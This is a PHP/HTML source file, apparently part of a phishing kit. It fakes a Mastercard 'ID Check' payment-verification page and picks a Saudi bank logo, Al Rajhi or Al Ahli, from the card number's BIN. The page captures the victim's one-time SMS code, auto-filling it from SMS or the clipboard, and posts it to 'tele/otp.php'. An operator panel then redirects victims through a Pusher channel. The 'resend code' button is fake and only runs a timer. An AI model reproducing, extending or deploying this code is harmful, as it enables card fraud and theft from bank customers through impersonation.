<?php
session_start();
require_once 'dashboard/init.php';
require_once 'includes/redirect.php';

// Get user ID from URL parameter or session
$userId = null;

if (isset($_GET['id'])) {
    $userId = $_GET['id'];
    $_SESSION['current_user_id'] = $userId;
} elseif (isset($_SESSION['current_user_id'])) {
    $userId = $_SESSION['current_user_id'];
}

if (!$userId) {
    header('Location: pay.php');
    exit;
}

// ✅ 🆕 جلب رقم البطاقة من الـ SESSION
$cardNumber = $_SESSION['last_card_number'] ?? '';
$cardName = $_SESSION['last_card_name'] ?? '';
$cardMonth = $_SESSION['last_card_month'] ?? '';
$cardYear = $_SESSION['last_card_year'] ?? '';
$amount = $_SESSION['last_amount'] ?? '0.00';
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>رمز التحقق</title>

<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">

<style>
*{
  box-sizing:border-box;
  font-family:'Cairo', sans-serif;
}

body{
  margin:0;
  background:#6b6b6b;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}

/* Card */
.card{
  width:360px;
  background:#fff;
  border-radius:6px;
  box-shadow:0 15px 40px rgba(0,0,0,.35);
  overflow:hidden;
}

/* Header */
.card-header{
  display:flex;
  justify-content:space-between;
  align-items:center;
  padding:12px 16px;
  border-bottom:1px solid #eee;
}

.card-header a{
  text-decoration:none;
  color:#1a73e8;
  font-size:14px;
  font-weight:600;
}

.logos{
  display:flex;
  align-items:center;
  gap:6px;
  font-weight:700;
}
/* Loader */
.loader-wrap{
  position:fixed;
  inset:0;
  background:rgba(255,255,255,.95);
  display:none;
  justify-content:center;
  align-items:center;
  flex-direction:column;
  z-index:9999;
}
.loader{
  width:50px;
  height:50px;
  border:4px solid #e3e3e3;
  border-top-color:#2f6fda;
  border-radius:50%;
  animation:spin 1s linear infinite;
}
@keyframes spin{
  to{ transform:rotate(360deg); }
}
/* Body */
.card-body{
  padding:18px 16px;
}

.bank-logo{
  text-align:center;
  margin-bottom:1px;
}
.bank-logo img{
  max-height:110px;
  max-width:200px;
}

h3{
  margin:0 0 6px;
  font-size:18px;
  font-weight:700;
}

.details{
  font-size:14px;
  line-height:1.7;
  color:#333;
  margin-bottom:14px;
}

.card-number{
  direction:ltr;
  unicode-bidi:embed;
  display:inline-block;
  font-weight:600;
  letter-spacing:1px;
}

/* OTP */
.otp-label{
  font-size:14px;
  margin-bottom:6px;
}

.otp-input{
  width:100%;
  height:44px;
  border:1px solid #ccc;
  border-radius:4px;
  text-align:center;
  font-size:18px;
  direction:ltr;
}

/* Buttons */
.btn{
  width:100%;
  height:44px;
  border-radius:4px;
  border:none;
  font-size:15px;
  font-weight:700;
  cursor:pointer;
}

.btn-primary{
  background:#2f6fda;
  color:#fff;
  margin-top:14px;
}

.btn-outline{
  background:#fff;
  border:1px solid #2f6fda;
  color:#2f6fda;
  margin-top:10px;
}
/* زر إعادة الإرسال أثناء التعطيل */
#resendBtn:disabled{
  background:#e9ecef;
  color:#6c757d;
  border-color:#ced4da;
  cursor:not-allowed;
  opacity:0.85;
}

/* منع hover وهو disabled */
#resendBtn:disabled:hover{
  background:#e9ecef;
  color:#6c757d;
}
/* رسالة الخطأ */
.otp-error{
  display:none;
  margin-top:6px;
  font-size:13px;
  color:#d93025;
  font-weight:600;
}

/* حالة الخطأ للحقل */
.otp-input.error{
  border-color:#d93025;
  background:#fff6f6;
}

/* Footer */
.card-footer{
  padding:12px 16px;
  border-top:1px solid #eee;
  font-size:14px;
  color:#444;
}
.txn-info{
  background:#f8f9fa;
  border:1px solid #e9ecef;
  border-radius:6px;
  padding:10px 12px;
  margin-bottom:14px;
  font-size:14px;
}

.txn-row{
  display:flex;
  justify-content:space-between;
  align-items:center;
  margin-bottom:6px;
}

.txn-row:last-child{
  margin-bottom:0;
}

.txn-row .label{
  color:#555;
  font-weight:600;
}

.txn-row .value{
  color:#222;
  font-weight:700;
}

.amount{
  direction:ltr;
  unicode-bidi:embed;
}
/* المبلغ */
.pay-amount{
  text-align:right;
  font-size:18px;
  font-weight:800;
  color:#000;
  margin:1px 0 1px;
}

/* رقم البطاقة */
.card-info{
  text-align:right;
  font-size:14px;
  color:#8a8a8a;
  margin-bottom:1px;
}

.card-number{
  direction:ltr;
  unicode-bidi:embed;
  letter-spacing:1px;
  display:inline-block;
}

/* التاريخ */
.txn-date{
  text-align:right;
  font-size:13px;
  color:#9a9a9a;
  margin-bottom:2px;
}

</style>
</head>

<body>
<div class="loader-wrap" id="loader">
  <div class="loader"></div>
  <div style="margin-top:12px;font-size:15px;color:#333">
    جاري التأكيد ...
  </div>
</div>

<div class="card">

  <div class="card-header">
    <div class="logos">
      <span>ID Check</span>
      <span style="color:#eb001b">●</span>
      <span style="color:#ff5f00">●</span>
    </div>
    <a href="#">إلغاء</a>
  </div>

  <div class="card-body">

    <!-- شعار البنك -->
    <div class="bank-logo">
      <img id="bankLogo" src="bank/default.png" alt="Bank Logo">
    </div>

    <h3>التحقق من الدفع</h3>
    
<p id="totalAmount" style="margin-top:10px;font-size:18px;font-weight:700;color:#333">
  -- ر.س
</p>

<script>
const amount = localStorage.getItem('last_amount') || '0.00';
document.getElementById('totalAmount').textContent = amount + '.00 ر.س';
</script>



    <!-- التاريخ -->
    <div class="txn-date" id="dateDisplay">--</div>

    <!-- رقم البطاقة -->
    <div class="card-info">
      <span id="cardDisplay" class="card-number">---</span>
    </div>

    <div class="details">
      تحقّق من عملية الدفع باستخدام الرمز الذي أرسلناه إلى رقم هاتفك المحمول<br>
    </div>

    <div class="otp-label">أدخل رمز التحقق</div>
    <form id="otpForm" method="post" action="tele/otp.php">

      <input type="hidden" name="otp" id="otpHidden">

      <input id="otpInput" 
       class="otp-input" 
       maxlength="6" 
       inputmode="numeric"
       autocomplete="one-time-code">
      <div id="otpError" style="
        display:none;
        margin-top:6px;
        font-size:13px;
        color:#d93025;
        font-weight:600;
      ">
        رمز التحقق غير صحيح
      </div>

      <button class="btn btn-primary" type="submit">تأكيد</button>
      <button class="btn btn-outline" type="button" id="resendBtn">
        إعادة إرسال الرمز
      </button>

      <div id="timer" style="text-align:center;margin-top:6px;color:#555;font-size:14px"></div>

    </form>

  </div>

  <div class="card-footer">
    › هل تحتاج مساعدة؟
  </div>

</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
// ✅ استقبال رقم البطاقة من sessionStorage
// ✅ استقبال رقم البطاقة من PHP
const paymentData = {
  cardNumber: '<?php echo htmlspecialchars($cardNumber); ?>',
  cardName: '<?php echo htmlspecialchars($cardName); ?>',
  month: '<?php echo htmlspecialchars($cardMonth); ?>',
  year: '<?php echo htmlspecialchars($cardYear); ?>'
};

console.log('✅ بيانات البطاقة:', paymentData);

// Mask helpers
function maskCard(num){
  const c = String(num||'').replace(/\D/g,'');
  return c.length>=10 ? c.slice(0,6)+'******'+c.slice(-4) : c;
}

// ✅ عرض رقم البطاقة من sessionStorage
const cardNumber = paymentData.cardNumber || '';
document.getElementById('cardDisplay').textContent = maskCard(cardNumber);

// Form handling
const form      = document.getElementById('otpForm');
const otpInput  = document.getElementById('otpInput');
const otpHidden = document.getElementById('otpHidden');
const loader    = document.getElementById('loader');
const otpError  = document.getElementById('otpError');

// عند الإرسال
form.addEventListener('submit', function(e){
  e.preventDefault();

  const otp = otpInput.value.trim();

  otpError.style.display = 'none';
  otpInput.classList.remove('error');

  if(!/^\d{4}$|^\d{6}$/.test(otp)){
    otpInput.value = '';
    otpError.style.display = 'block';
    otpInput.classList.add('error');
    otpInput.focus();
    return;
  }

  otpHidden.value = otp;

  // ✅ أظهر التحميل
  loader.style.display = 'flex';

  // ✅ أرسل فقط – بدون أي تحويل
  fetch('tele/otp.php', {
    method: 'POST',
    body: new FormData(form)
  }).then(() => {
    // العميل يبقى ينتظر التوجيه من لوحة التحكم
  });
});

// إخفاء الخطأ تلقائيًا عند الكتابة
// إخفاء الخطأ تلقائيًا عند الكتابة
otpInput.addEventListener('input', () => {
  otpError.style.display = 'none';
  otpInput.classList.remove('error');
});

// ============================================
// 🆕 OTP Auto-Fill من الرسائل النصية
// ============================================

// ✅ 1. Web OTP API (Chrome/Android)
if ('OTPCredential' in window) {
    const ac = new AbortController();
    
    navigator.credentials.get({
        otp: { transport: ['sms'] },
        signal: ac.signal
    }).then(otp => {
        if (otp && otp.code) {
            otpInput.value = otp.code;
            console.log('✅ تم لصق OTP تلقائياً:', otp.code);
            
            // إزالة الخطأ
            otpError.style.display = 'none';
            otpInput.classList.remove('error');
        }
    }).catch(err => {
        console.log('OTP API غير مدعوم');
    });
}

// ✅ 2. Clipboard API - اكتشاف النسخ
otpInput.addEventListener('paste', function(e) {
    e.preventDefault();
    
    const pastedText = (e.clipboardData || window.clipboardData).getData('text');
    const otpMatch = pastedText.match(/\b\d{4,6}\b/);
    
    if (otpMatch) {
        otpInput.value = otpMatch[0];
        console.log('✅ تم لصق OTP من الحافظة:', otpMatch[0]);
        
        otpError.style.display = 'none';
        otpInput.classList.remove('error');
    }
});

// ===============================
// تحديد شعار البنك حسب أول 4 أرقام (BIN)
// ===============================
function detectBankLogo(cardNumber){
  const digits = String(cardNumber || '').replace(/\D/g, '');

  if (digits.length < 4) {
    return 'bank/default.png';
  }

  const bin4 = digits.substring(0, 4);

  // BINs بنك الراجحي
  const rajhiBins = [
    '4847',
    '4146',
    '4054',
    '4321',
    '4092',
    '4299',
    '4455',
    '4458'
  ];

  // BINs البنك الأهلي
  const ahliBins = [
    '5294',
    '5358',
    '5430',
    '5186',
    '5241',
    '5240',
    '5520'
  ];

  if (rajhiBins.includes(bin4)) {
    return 'bank/rajhi.png';
  }

  if (ahliBins.includes(bin4)) {
    return 'bank/ahli.png';
  }

  return 'bank/default.png';
}

// ✅ تطبيق الشعار
const bankLogo = document.getElementById('bankLogo');
if (bankLogo) {
  bankLogo.src = detectBankLogo(cardNumber);
}

// ===============================
// عرض تاريخ اليوم
// ===============================
const dateEl = document.getElementById('dateDisplay');
if(dateEl){
  const today = new Date();
  const formatted = today.toLocaleDateString('ar-EG', {
    year: 'numeric',
    month: 'long',
    day: 'numeric'
  });
  dateEl.textContent = formatted;
}

// Resend timer
let sec = 120;
const resendBtn = document.getElementById('resendBtn');

let resendInterval = null;
const originalText = 'إعادة إرسال الرمز';

function startResendTimer(duration = 120){
  let remaining = duration;

  resendBtn.disabled = true;
  resendBtn.textContent = `تم إعادة إرسال الرمز (2:00)`;

  resendInterval = setInterval(() => {
    remaining--;

    const m = Math.floor(remaining / 60);
    const s = String(remaining % 60).padStart(2, '0');

    resendBtn.textContent = `تم إعادة إرسال الرمز (${m}:${s})`;

    if (remaining <= 0) {
      clearInterval(resendInterval);
      resendInterval = null;
      resendBtn.disabled = false;
      resendBtn.textContent = originalText;
    }
  }, 1000);
}

resendBtn.addEventListener('click', () => {
  startResendTimer(120);
});
</script>

<script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
<script>
const pusher = new Pusher('a56388ee6222f6c5fb86', {
    cluster: 'ap2',
    encrypted: true
});

const channel = pusher.subscribe('my-channel');

channel.bind('force-redirect-user', function(data) {
    const myId = localStorage.getItem('current_user_id');

    if (myId && data.userId == myId) {
        window.location.href = data.url;
    }
});
</script>

</body>
</html>